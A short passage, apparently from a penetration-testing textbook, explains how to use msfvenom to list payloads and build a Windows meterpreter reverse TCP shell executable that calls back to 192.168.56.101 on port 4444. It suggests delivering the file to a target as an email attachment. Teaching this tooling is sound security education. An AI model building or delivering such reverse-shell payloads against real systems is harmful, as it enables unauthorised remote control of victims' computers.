  md: 'You can list all the available payloads with the command **msfvenom -l payloads**
    as shown in Figure 14-11.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_341_0.png)


    FIGURE 14-11 **msfvenom payloads.**


    The two most important flags are **-p**, which defines the payload you wish to
    deploy, and **-f**, which defines the format. Do you wish to deploy an executable?
    A PDF file? An AVI file? These are all options.


    Let’s look at an example. Let’s suppose that you want to deploy the reverse tcp
    shell as an executable:


    ```

    windows/meterpreter/reverse_tcp

    ```


    Then you will send that executable to the target, perhaps as an email attachment.
    If your IP address is 192.168.56.101, then your entire command is:


    ```

    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f
    exe -o mypayload.exe

    ```


    You can see this in Figure 14-12. For now, ignore the message that no architecture
    was selected; we will deal with that in just a bit.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_341_1.png)


